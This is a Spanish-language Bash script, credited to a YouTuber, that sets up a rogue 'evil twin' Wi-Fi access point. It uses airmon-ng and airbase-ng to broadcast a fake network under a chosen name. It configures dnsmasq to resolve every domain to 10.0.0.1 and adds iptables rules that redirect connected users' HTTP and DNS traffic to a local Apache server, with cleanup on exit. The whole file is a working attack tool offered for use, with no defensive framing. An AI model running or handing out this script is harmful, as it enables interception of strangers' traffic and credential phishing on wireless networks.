#!/bin/bash

# Colores
cafe="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
rojo="\e[0;31m\033[1m"
azul="\e[0;34m\033[1m"
amarillo="\e[0;33m\033[1m"
purpura="\e[0;35m\033[1m"
turquia="\e[0;36m\033[1m"
gris="\e[0;37m\033[1m"

# Comprobación de privilegios de root
if [ "$(id -u)" -ne 0 ]; then
    echo -e "\n${rojo}Ponte en modo root we necesito privilejios maximos${endColour}\n"
    exit 1
fi

# Mensaje de autor
echo -e "\n${rojo}Hecho por ErnestoPRO, suscribete a mi canal http://www.youtube.com/@ErnestoPRO-w1z${endColour}\n\n"

# Listado de interfaces de red disponibles
Interfacess=$(ip link show | awk -F: '/^[0-9]+: /{print $1 ": " $2}' | sed 's/^[ \t]*//;s/[ \t]*$//')
echo -e "${amarillo}Las interfaces de red disponibles son:${endColour}"
echo -e "$Interfacess"

# Selección de la interfaz de red
echo -e "${amarillo}"
read -p "Por favor pon el nombre de tu Interface de red: " InterfaceRed
echo -e "${endColour}"

# Comprobar si la interfaz ya está en modo monitor
if ip link show | grep -q "${InterfaceRed}mon"; then
    echo -e "\n\n${azul}La interfaz ya está en modo monitor: ${InterfaceRed}mon${endColour}\n\n"
else
    # Poner la interfaz en modo monitor
    airmon-ng start $InterfaceRed
    if [ $? -ne 0 ]; then
        echo -e "${rojo}Error al poner la interfaz en modo monitor.${endColour}"
        exit 1
    fi
    echo -e "\n\n${azul}Interface de red puesta en modo monitor${endColour}\n\n"
fi

# Configuración de dnsmasq
if ! grep -q "interface=" /etc/dnsmasq.conf; then
    echo "interface=${InterfaceRed}mon" | sudo tee -a /etc/dnsmasq.conf
    echo "dhcp-range=10.0.0.2,10.0.0.20,255.255.255.0,24h" | sudo tee -a /etc/dnsmasq.conf
    echo "address=/#/10.0.0.1" | sudo tee -a /etc/dnsmasq.conf
    echo -e "${azul}Configuración de dnsmasq añadida a /etc/dnsmasq.conf${endColour}"
else
    echo -e "${amarillo}La configuración de dnsmasq ya existe.${endColour}"
fi

# Nombre del punto de acceso falso
echo -e "\e[0;33mEscriba como quieres que se llame tu punto de acceso falso: \e[0m"
read NameAP
if [ -z "$NameAP" ]; then
    echo -e "${rojo}El nombre del punto de acceso no puede estar vacío.${endColour}"
    exit 1
fi

# Selección del canal
echo -e "\e[0;33mAhora dime el canal que deseas utilizar (debe ser del 1 hasta el 12): \e[0m"
read Canal
if ! [[ "$Canal" =~ ^[1-9]$|^1[0-2]$ ]]; then
    echo -e "${rojo}Canal inválido. Debe ser un número del 1 al 12.${endColour}"
    exit 1
fi

# Creación del punto de acceso falso
airbase-ng -e "$NameAP" -c "$Canal" wlan0mon &
sleep 5
echo -e "\n\n${gris}Punto de acceso creado${endColour}\n\n"

# Configuración de iptables para redirigir tráfico HTTP y DNS
sudo iptables --table nat --append PREROUTING --protocol tcp --dport 80 --jump DNAT --to-destination 10.0.0.1:80
sudo iptables --table nat --append PREROUTING --protocol udp --dport 53 --jump DNAT --to-destination 10.0.0.1:53
sudo iptables --append FORWARD --in-interface wlan0mon --jump ACCEPT
sudo iptables --table nat --append POSTROUTING --out-interface wlan0 --jump MASQUERADE

# Iniciar dnsmasq y Apache
sudo dnsmasq -C /etc/dnsmasq.conf -d &
if [ $? -ne 0 ]; then
    echo -e "${rojo}Error al iniciar dnsmasq.${endColour}"
    exit 1
fi

sudo systemctl start apache2
if [ $? -ne 0 ]; then
    echo -e "${rojo}Error al iniciar Apache.${endColour}"
    exit 1
fi

echo -e "${amarillo}El entorno está listo. Los usuarios que se conecten serán redirigidos a tu servidor.${endColour}"

# Función de limpieza
cleanup() {
    echo -e "${amarillo}Limpiando configuraciones y deteniendo servicios...${endColour}"
    sudo iptables --table nat --delete PREROUTING --protocol tcp --dport 80 --jump DNAT --to-destination 10.0.0.1:80
    sudo iptables --table nat --delete PREROUTING --protocol udp --dport 53 --jump DNAT --to-destination 10.0.0.1:53
    sudo iptables --delete FORWARD --in-interface wlan0mon --jump ACCEPT
    sudo iptables --table nat --delete POSTROUTING --out-interface wlan0 --jump MASQUERADE
    sudo pkill dnsmasq
    sudo systemctl stop apache2
    airmon-ng stop wlan0mon
}

trap cleanup EXIT
